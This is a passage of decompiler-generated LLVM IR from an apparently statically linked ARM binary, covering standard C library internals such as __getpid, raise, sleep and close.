  %v1_1545017 = inttoptr i32 %v0_15448 to i32*
  %v2_1545018 = load i32, i32* %v1_1545017, align 4
  %v3_1545420 = icmp ne i32 %v2_1545018, 0
  store i1 %v3_1545420, i1* %cpsr_c.global-to-local, align 1
  %v9_1545426 = icmp eq i32 %v2_1545018, 1
  br i1 %v9_1545426, label %dec_label_pc_1545c, label %dec_label_pc_15474

dec_label_pc_1545c:                               ; preds = %dec_label_pc_15444, %dec_label_pc_1545c.dec_label_pc_15450_crit_edge
  %v0_1545c27 = phi i32 [ %v1_15454.pre, %dec_label_pc_1545c.dec_label_pc_15450_crit_edge ], [ 1, %dec_label_pc_15444 ]
  store i32 %v0_1545c27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1546c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1546c, label %dec_label_pc_15470, label %dec_label_pc_1545c.dec_label_pc_15450_crit_edge

dec_label_pc_1545c.dec_label_pc_15450_crit_edge:  ; preds = %dec_label_pc_1545c
  %v0_15450.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15454.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15450 = inttoptr i32 %v0_15450.pre to i32*
  %v2_15450 = load i32, i32* %v1_15450, align 4
  %v3_15454 = icmp uge i32 %v2_15450, %v1_15454.pre
  store i1 %v3_15454, i1* %cpsr_c.global-to-local, align 1
  %v9_15454 = icmp eq i32 %v2_15450, %v1_15454.pre
  br i1 %v9_15454, label %dec_label_pc_1545c, label %dec_label_pc_15474

dec_label_pc_15470:                               ; preds = %dec_label_pc_1545c
  %v0_15470 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15474

dec_label_pc_15474:                               ; preds = %dec_label_pc_15444, %dec_label_pc_1545c.dec_label_pc_15450_crit_edge, %dec_label_pc_15470
  %v0_15474 = phi i32 [ %v0_15470, %dec_label_pc_15470 ], [ %v2_1545018, %dec_label_pc_15444 ], [ %v2_15450, %dec_label_pc_1545c.dec_label_pc_15450_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15474 = icmp eq i32 %v0_15474, 0
  %v0_15498.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15474, label %dec_label_pc_15494, label %dec_label_pc_1547c

dec_label_pc_1547c:                               ; preds = %dec_label_pc_15474
  store i32 %v0_15498.pre, i32* %r0.global-to-local, align 4
  %v0_15480 = load i32, i32* %r1.global-to-local, align 4
  %v1_15480 = add i32 %v0_15480, 126
  store i32 %v1_15480, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15494

dec_label_pc_15494:                               ; preds = %dec_label_pc_15474, %dec_label_pc_1547c
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_15498.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_154a028 = inttoptr i32 %v0_15498.pre to i32*
  %v2_154a029 = load i32, i32* %v1_154a028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_154a436 = icmp eq i32 %v2_154a029, 0
  br i1 %v9_154a436, label %dec_label_pc_154ac, label %dec_label_pc_154c4

dec_label_pc_154ac:                               ; preds = %dec_label_pc_15494, %dec_label_pc_154ac.dec_label_pc_154a0_crit_edge
  %v0_154ac37 = phi i32 [ %v1_154a4.pre, %dec_label_pc_154ac.dec_label_pc_154a0_crit_edge ], [ 0, %dec_label_pc_15494 ]
  store i32 %v0_154ac37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_154bc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_154bc, label %dec_label_pc_154c0, label %dec_label_pc_154ac.dec_label_pc_154a0_crit_edge

dec_label_pc_154ac.dec_label_pc_154a0_crit_edge:  ; preds = %dec_label_pc_154ac
  %v0_154a0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_154a4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_154a0 = inttoptr i32 %v0_154a0.pre to i32*
  %v2_154a0 = load i32, i32* %v1_154a0, align 4
  %v3_154a4 = icmp uge i32 %v2_154a0, %v1_154a4.pre
  store i1 %v3_154a4, i1* %cpsr_c.global-to-local, align 1
  %v9_154a4 = icmp eq i32 %v2_154a0, %v1_154a4.pre
  br i1 %v9_154a4, label %dec_label_pc_154ac, label %dec_label_pc_154c4

dec_label_pc_154c0:                               ; preds = %dec_label_pc_154ac
  %v0_154c0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_154c4

dec_label_pc_154c4:                               ; preds = %dec_label_pc_15494, %dec_label_pc_154ac.dec_label_pc_154a0_crit_edge, %dec_label_pc_154c0
  %v0_154c4 = phi i32 [ %v0_154c0, %dec_label_pc_154c0 ], [ %v2_154a029, %dec_label_pc_15494 ], [ %v2_154a0, %dec_label_pc_154ac.dec_label_pc_154a0_crit_edge ]
  %v1_154c4 = phi i32 [ %v0_154c0, %dec_label_pc_154c0 ], [ 0, %dec_label_pc_15494 ], [ %v1_154a4.pre, %dec_label_pc_154ac.dec_label_pc_154a0_crit_edge ]
  %v3_154c4 = icmp uge i32 %v0_154c4, %v1_154c4
  store i1 %v3_154c4, i1* %cpsr_c.global-to-local, align 1
  %v9_154c4 = icmp eq i32 %v0_154c4, %v1_154c4
  br i1 %v9_154c4, label %dec_label_pc_154cc, label %dec_label_pc_154c4.dec_label_pc_15444_crit_edge

dec_label_pc_154c4.dec_label_pc_15444_crit_edge:  ; preds = %dec_label_pc_154c4
  %v0_15448.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15444

dec_label_pc_154cc:                               ; preds = %dec_label_pc_154c4
  %v2_154cc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_154cc, i32* %r4.global-to-local, align 4
  %v1_154d0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_154d0

; uselistorder directives
  uselistorder i32 %v0_154c0, { 1, 0 }
  uselistorder i32 %v1_154a4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15454.pre, { 2, 1, 0 }
  uselistorder i32 %v2_1545018, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 0, 5, 7, 6, 1 }
  uselistorder i32 126, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_154c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_154ac, { 1, 0 }
  uselistorder label %dec_label_pc_15494, { 1, 0 }
  uselistorder label %dec_label_pc_15474, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1545c, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_154d4 = load i32, i32* @r7, align 4
  store i32 %v3_154d4, i32* %stack_var_-8, align 4
  %v0_154d8 = call i32 @__aeabi_read_tp()
  store i32 %v0_154d8, i32* %r0.global-to-local, align 4
  %v1_154dc = add i32 %v0_154d8, -1060
  %v2_154dc = inttoptr i32 %v1_154dc to i32*
  %v3_154dc = load i32, i32* %v2_154dc, align 4
  %tmp7 = icmp slt i32 %v3_154dc, 1
  br i1 %tmp7, label %dec_label_pc_154ec, label %dec_label_pc_15510

dec_label_pc_154ec:                               ; preds = %entry
  %v2_154e0 = icmp eq i32 %v3_154dc, 0
  br i1 %v2_154e0, label %dec_label_pc_154f0, label %dec_label_pc_154fc

dec_label_pc_154f0:                               ; preds = %dec_label_pc_154ec
  %v1_154f0 = add i32 %v0_154d8, -1064
  %v2_154f0 = inttoptr i32 %v1_154f0 to i32*
  %v3_154f0 = load i32, i32* %v2_154f0, align 4
  store i32 %v3_154f0, i32* %r0.global-to-local, align 4
  %v2_154f4 = icmp eq i32 %v3_154f0, 0
  br i1 %v2_154f4, label %bb, label %bb8

dec_label_pc_154fc:                               ; preds = %dec_label_pc_154ec
  br label %bb8

bb:                                               ; preds = %dec_label_pc_154f0
  store i32 0, i32* %v2_154f0, align 4
  %v0_1550c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_154fc, %dec_label_pc_154f0, %bb
  %v0_1550c = phi i32 [ %v3_154f0, %dec_label_pc_154f0 ], [ %v0_154d8, %dec_label_pc_154fc ], [ %v0_1550c.pre, %bb ]
  br label %dec_label_pc_15510

dec_label_pc_15510:                               ; preds = %entry, %bb8
  %v0_15510 = phi i32 [ %v3_154dc, %entry ], [ %v0_1550c, %bb8 ]
  store i32 %v0_15510, i32* %r0.global-to-local, align 4
  %v2_15514 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15514, i32* @r7, align 4
  ret i32 %v0_15510

; uselistorder directives
  uselistorder i32 %v0_15510, { 1, 0 }
  uselistorder i32 %v3_154dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15510, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1551c = load i32, i32* @r4, align 4
  store i32 %v3_1551c, i32* %stack_var_-20, align 4
  %v0_15524 = call i32 @__aeabi_read_tp()
  store i32 %v0_15524, i32* %r0.global-to-local, align 4
  %v1_15528 = add i32 %v0_15524, -1064
  %v2_15528 = inttoptr i32 %v1_15528 to i32*
  %v3_15528 = load i32, i32* %v2_15528, align 4
  store i32 %v3_15528, i32* %r4.global-to-local, align 4
  %v2_1552c = icmp eq i32 %v3_15528, 0
  %v1_15534 = add i32 %v0_15524, -1060
  %v2_15534 = inttoptr i32 %v1_15534 to i32*
  %v3_15534 = load i32, i32* %v2_15534, align 4
  store i32 %v3_15534, i32* %r0.global-to-local, align 4
  br i1 %v2_1552c, label %dec_label_pc_1553c, label %dec_label_pc_15550

dec_label_pc_1553c:                               ; preds = %entry
  store i32 %v3_15534, i32* %r4.global-to-local, align 4
  store i32 %v3_15534, i32* %v2_15528, align 4
  %v0_15578.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_15550:                               ; preds = %entry
  %v5_15554 = icmp sgt i32 %v3_15534, 0
  br i1 %v5_15554, label %bb28, label %dec_label_pc_15558

dec_label_pc_15558:                               ; preds = %dec_label_pc_15550
  %tmp = bitcast i32 %v3_15534 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_15558 = bitcast float %tmp30 to i32
  %v2_1555c = icmp eq i32 %v1_15558, 0
  br i1 %v2_1555c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15558
  store i32 %v3_15528, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_15558
  %v2_15564 = sub i32 0, %v3_15534
  store i32 %v2_15564, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_15550, %dec_label_pc_1553c, %.thread
  %v0_1557c = phi i32 [ %v3_15534, %dec_label_pc_15550 ], [ %v0_15578.pre, %dec_label_pc_1553c ], [ %v3_15528, %bb ], [ %v2_15564, %.thread ]
  store i32 %v0_1557c, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_1557c, -4095
  br i1 %tmp31, label %dec_label_pc_155a0, label %dec_label_pc_15588

dec_label_pc_15588:                               ; preds = %bb28
  %v0_1558c = call i32 @__aeabi_read_tp()
  %v3_15590 = load i16, i16* @global_var_23068.362, align 2
  %v4_15590 = sext i16 %v3_15590 to i32
  %v0_15594 = load i32, i32* %r2.global-to-local, align 4
  %v1_15594 = sub i32 0, %v0_15594
  store i32 %v1_15594, i32* %r2.global-to-local, align 4
  %v3_15598 = add i32 %v4_15590, %v0_1558c
  %v4_15598 = inttoptr i32 %v3_15598 to i32*
  store i32 %v1_15594, i32* %v4_15598, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %bb28, %dec_label_pc_15588
  %v0_155a4 = phi i32 [ %v0_1557c, %bb28 ], [ -1, %dec_label_pc_15588 ]
  %v3_155a0 = icmp eq i32 %v0_155a4, -1
  store i32 %v0_155a4, i32* %r5.global-to-local, align 4
  br i1 %v3_155a0, label %dec_label_pc_155ac, label %dec_label_pc_155f4

dec_label_pc_155ac:                               ; preds = %dec_label_pc_155a0
  %v0_155b0 = call i32 @__aeabi_read_tp()
  store i32 %v0_155b0, i32* %r0.global-to-local, align 4
  %v3_155b4 = load i16, i16* @global_var_23068.362, align 2
  %v4_155b4 = sext i16 %v3_155b4 to i32
  %v2_155b8 = add i32 %v4_155b4, %v0_155b0
  %v3_155b8 = inttoptr i32 %v2_155b8 to i32*
  %v4_155b8 = load i32, i32* %v3_155b8, align 4
  %v7_155bc = icmp eq i32 %v4_155b8, 38
  br i1 %v7_155bc, label %dec_label_pc_155c8, label %dec_label_pc_155ac.dec_label_pc_155f4_crit_edge

dec_label_pc_155ac.dec_label_pc_155f4_crit_edge:  ; preds = %dec_label_pc_155ac
  %v0_155f4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_155f4

dec_label_pc_155c8:                               ; preds = %dec_label_pc_155ac
  %v0_155c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_155c8, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_155c8, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_155c8
  %v5_155e0 = sub i32 0, %v0_155c8
  store i32 %v5_155e0, i32* %r2.global-to-local, align 4
  %v7_155e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_155ec.540 to i32), i32 55932) to i32*), align 4
  %v4_155e8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_155e8, i32* %r0.global-to-local, align 4
  %v7_155ec = add i32 %v7_155e4, %v0_155b0
  %v8_155ec = inttoptr i32 %v7_155ec to i32*
  store i32 %v5_155e0, i32* %v8_155ec, align 4
  %v0_155f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_155c8, %bb29
  %v0_155f0 = phi i32 [ %v0_155f0.pre, %bb29 ], [ %v0_155c8, %dec_label_pc_155c8 ]
  store i32 %v0_155f0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_155f4

dec_label_pc_155f4:                               ; preds = %dec_label_pc_155ac.dec_label_pc_155f4_crit_edge, %dec_label_pc_155a0, %.thread22
  %v0_155f4 = phi i32 [ %v0_155f4.pre, %dec_label_pc_155ac.dec_label_pc_155f4_crit_edge ], [ %v0_155a4, %dec_label_pc_155a0 ], [ %v0_155f0, %.thread22 ]
  store i32 %v0_155f4, i32* %r0.global-to-local, align 4
  %v2_155f8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_155f8, i32* @r4, align 4
  ret i32 %v0_155f4

; uselistorder directives
  uselistorder i32 %v0_155f4, { 1, 0 }
  uselistorder i32 %v0_155c8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1557c, { 2, 0, 1 }
  uselistorder i32 %v3_15534, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_155f4, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_155a0, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_1560c = load i32, i32* @r4, align 4
  %v6_1560c = load i32, i32* @r5, align 4
  %v9_1560c = load i32, i32* @r6, align 4
  %v12_1560c = load i32, i32* @r7, align 4
  %v15_1560c = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1561c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_23010.366 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_1561c, label %dec_label_pc_15630, label %dec_label_pc_156a4

dec_label_pc_15630:                               ; preds = %entry
  %v0_15630 = call i32 @__aeabi_read_tp()
  %v1_15634 = add i32 %v0_15630, -1036
  %v2_15634 = inttoptr i32 %v1_15634 to i32*
  %v3_15634 = load i32, i32* %v2_15634, align 4
  %v1_15638 = and i32 %v3_15634, -71
  %v2_1563c = icmp ugt i32 %v1_15638, 7
  store i1 %v2_1563c, i1* %cpsr_c.global-to-local, align 1
  %v7_1563c = icmp eq i32 %v1_15638, 8
  %v1_15640 = add i32 %v0_15630, -1168
  store i32 %v1_15640, i32* @r5, align 4
  br i1 %v7_1563c, label %dec_label_pc_15648, label %dec_label_pc_1571c

dec_label_pc_15648:                               ; preds = %dec_label_pc_15630
  %v2_1564c = add i32 %v0_15630, -624
  %v3_1564c = inttoptr i32 %v2_1564c to i32*
  store i32 -1, i32* %v3_1564c, align 4
  %v0_15650 = load i32, i32* @r5, align 4
  %v1_15650 = add i32 %v0_15650, 132
  store i32 %v1_15650, i32* @r6, align 4
  br label %dec_label_pc_15654

dec_label_pc_15654:                               ; preds = %dec_label_pc_15688.dec_label_pc_15654_crit_edge, %dec_label_pc_15648
  %v0_15658 = phi i32 [ %v0_15658.pre, %dec_label_pc_15688.dec_label_pc_15654_crit_edge ], [ %v1_15650, %dec_label_pc_15648 ]
  %v0_15654 = phi i32 [ %v0_15690, %dec_label_pc_15688.dec_label_pc_15654_crit_edge ], [ %v0_15650, %dec_label_pc_15648 ]
  %v1_15654 = add i32 %v0_15654, 132
  %v2_15654 = inttoptr i32 %v1_15654 to i32*
  %v3_15654 = load i32, i32* %v2_15654, align 4
  store i32 %v0_15658, i32* %r2.global-to-local, align 4
  store i32 %v3_15654, i32* @r4, align 4
  %v1_1566430 = inttoptr i32 %v0_15658 to i32*
  %v2_1566431 = load i32, i32* %v1_1566430, align 4
  %v3_1566833 = icmp uge i32 %v2_1566431, %v3_15654
  store i1 %v3_1566833, i1* %cpsr_c.global-to-local, align 1
  %v9_1566839 = icmp eq i32 %v2_1566431, %v3_15654
  br i1 %v9_1566839, label %dec_label_pc_15670, label %dec_label_pc_15688

dec_label_pc_15670:                               ; preds = %dec_label_pc_15654, %dec_label_pc_15670.dec_label_pc_15664_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15680 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15680, label %dec_label_pc_15684, label %dec_label_pc_15670.dec_label_pc_15664_crit_edge

dec_label_pc_15670.dec_label_pc_15664_crit_edge:  ; preds = %dec_label_pc_15670
  %v0_15664.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15668.pre = load i32, i32* @r4, align 4
  %v1_15664 = inttoptr i32 %v0_15664.pre to i32*
  %v2_15664 = load i32, i32* %v1_15664, align 4
  %v3_15668 = icmp uge i32 %v2_15664, %v1_15668.pre
  store i1 %v3_15668, i1* %cpsr_c.global-to-local, align 1
  %v9_15668 = icmp eq i32 %v2_15664, %v1_15668.pre
  br i1 %v9_15668, label %dec_label_pc_15670, label %dec_label_pc_15688

dec_label_pc_15684:                               ; preds = %dec_label_pc_15670
  %v0_15684 = load i32, i32* @r4, align 4
  br label %dec_label_pc_15688

dec_label_pc_15688:                               ; preds = %dec_label_pc_15654, %dec_label_pc_15670.dec_label_pc_15664_crit_edge, %dec_label_pc_15684
  %v0_15688 = phi i32 [ %v0_15684, %dec_label_pc_15684 ], [ %v2_1566431, %dec_label_pc_15654 ], [ %v2_15664, %dec_label_pc_15670.dec_label_pc_15664_crit_edge ]
  %v1_15688 = phi i32 [ %v0_15684, %dec_label_pc_15684 ], [ %v3_15654, %dec_label_pc_15654 ], [ %v1_15668.pre, %dec_label_pc_15670.dec_label_pc_15664_crit_edge ]
  %v3_15688 = icmp uge i32 %v0_15688, %v1_15688
  store i1 %v3_15688, i1* %cpsr_c.global-to-local, align 1
  %v9_15688 = icmp eq i32 %v0_15688, %v1_15688
  br i1 %v9_15688, label %dec_label_pc_15690, label %dec_label_pc_15688.dec_label_pc_15654_crit_edge

dec_label_pc_15688.dec_label_pc_15654_crit_edge:  ; preds = %dec_label_pc_15688
  %v0_15690 = load i32, i32* @r5, align 4
  %v0_15658.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15654

dec_label_pc_15690:                               ; preds = %dec_label_pc_15688
  %v0_15698 = load i32, i32* @r7, align 4
  %v2_15698 = add i32 %v0_15698, 116
  %v3_15698 = inttoptr i32 %v2_15698 to i32*
  %v4_15698 = load i32, i32* %v3_15698, align 4
  store i32 87716, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_15698)
  %v0_156ac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %entry, %dec_label_pc_15690
  %v0_156ac = phi i32 [ 0, %entry ], [ %v0_156ac.pre, %dec_label_pc_15690 ]
  %v2_156b0 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_156b0, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_156bc = call i32 @__libc_sigaction(i32 17, i32 %v0_156ac, i32 %v2_156b0)
  %v3_156c0 = load i32, i32* %stack_var_-60, align 4
  %v2_156c4 = icmp ne i32 %v3_156c0, 0
  store i1 %v2_156c4, i1* %cpsr_c.global-to-local, align 1
  %v7_156c4 = icmp eq i32 %v3_156c0, 1
  br i1 %v7_156c4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_156a4
  %v3_156c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_156c8, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_156a4, %bb
  call void @__pseudo_cond_branch(i1 %v7_156c4, i32 ptrtoint (i32* @global_var_123e4.544 to i32))
  %v2_156d8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_156e0 = call i32 @__libc_nanosleep(i32 %v2_156d8, i32 %v2_156d8)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_156e4 = icmp eq i32 %v2_156e0, 0
  br i1 %v2_156e4, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_156f8 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_156f8, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_15708 = load i32, i32* %stack_var_-40, align 4
  %v1_1570c = and i32 %v3_15708, 65536
  store i32 %v1_1570c, i32* %r2.global-to-local, align 4
  %v2_1570c = icmp eq i32 %v1_1570c, 0
  br i1 %v2_1570c, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_1570c, i32 ptrtoint (i32* @global_var_123e4.544 to i32))
  br label %dec_label_pc_1571c

dec_label_pc_1571c:                               ; preds = %dec_label_pc_15630, %.thread5
  %v0_1571c = load i32, i32* @r4, align 4
  store i32 %v3_1560c, i32* @r4, align 4
  store i32 %v6_1560c, i32* @r5, align 4
  store i32 %v9_1560c, i32* @r6, align 4
  store i32 %v12_1560c, i32* @r7, align 4
  store i32 %v15_1560c, i32* @lr, align 4
  ret i32 %v0_1571c

; uselistorder directives
  uselistorder i32 %v0_15684, { 1, 0 }
  uselistorder i32 %v1_15668.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 0, 2, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1571c, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_156a4, { 1, 0 }
  uselistorder label %dec_label_pc_15688, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15670, { 1, 0 }
}

define i32 @function_15730(i32 %arg1) local_unnamed_addr {
dec_label_pc_15730:
  %v0_15730 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15730, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_15730
  %v2_15730 = load i32, i32* @r4, align 4
  %v4_15730 = lshr i32 %v2_15730, %arg1
  %v5_15730 = sub i32 32, %arg1
  %v6_15730 = shl i32 %v2_15730, %v5_15730
  %v7_15730 = or i32 %v6_15730, %v4_15730
  %v9_15730 = and i32 %v7_15730, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_15730, %bb
  %v0_15734 = phi i32 [ %arg1, %dec_label_pc_15730 ], [ %v9_15730, %bb ]
  ret i32 %v0_15734

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_15754 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15754, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15754 = load i32, i32* @r0, align 4
  ret i32 %v2_15754

bb1:                                              ; preds = %entry
  %v0_15758 = call i32 @__syscall_error()
  ret i32 %v0_15758
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15764 = load i32, i32* @global_var_261f4.548, align 4
  %v2_15768 = icmp eq i32 %v3_15764, 0
  store i1 %v2_15768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15768, label %dec_label_pc_15770, label %entry.dec_label_pc_1578c_crit_edge

entry.dec_label_pc_1578c_crit_edge:               ; preds = %entry
  %v3_1578c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1578c

dec_label_pc_15770:                               ; preds = %entry
  %v0_15770 = load i32, i32* @r7, align 4
  store i32 %v0_15770, i32* @ip, align 4
  %v0_15780 = load i32, i32* @r0, align 4
  %v2_15780 = icmp ugt i32 %v0_15780, -4097
  %v7_15780 = icmp eq i32 %v0_15780, -4096
  store i1 %v7_15780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15780, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_1578c, %bb8, %bb9, %dec_label_pc_15770
  %merge2 = phi i32 [ %v0_15780, %dec_label_pc_15770 ], [ %v0_157b0, %dec_label_pc_1578c ], [ %v0_157c0, %bb8 ], [ %v0_157c0, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_15770
  %v0_15788 = call i32 @__syscall_error()
  br label %dec_label_pc_1578c

dec_label_pc_1578c:                               ; preds = %entry.dec_label_pc_1578c_crit_edge, %bb7
  %v3_1578c = phi i32 [ %v3_1578c.pre, %entry.dec_label_pc_1578c_crit_edge ], [ %v0_15788, %bb7 ]
  %v9_1578c = load i32, i32* @r7, align 4
  store i32 %v9_1578c, i32* %stack_var_-8, align 4
  %v12_1578c = load i32, i32* @lr, align 4
  %v0_15790 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_15790, i32* @ip, align 4
  store i32 %v3_1578c, i32* @r7, align 4
  %v1_157ac = call i32 @__libc_disable_asynccancel(i32 %v0_15790)
  %v0_157b0 = load i32, i32* @r7, align 4
  store i32 %v0_157b0, i32* @r0, align 4
  %v2_157b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_157b4, i32* @r7, align 4
  store i32 %v12_1578c, i32* @lr, align 4
  %v2_157b8 = icmp ugt i32 %v0_157b0, -4097
  %v7_157b8 = icmp eq i32 %v0_157b0, -4096
  store i1 %v7_157b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_157b8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_1578c
  %v0_157c0 = call i32 @__syscall_error()
  %v0_157d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_157d0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v3_157d0 = load i32, i32* @r1, align 4
  %v4_157d0 = inttoptr i32 %v3_157d0 to i32*
  store i32 %v0_157c0, i32* %v4_157d0, align 4
  %v5_157d0 = load i32, i32* @r8, align 4
  %v6_157d0 = load i32, i32* @r1, align 4
  %v7_157d0 = sub i32 %v6_157d0, %v5_157d0
  store i32 %v7_157d0, i32* @r1, align 4
  br label %bb

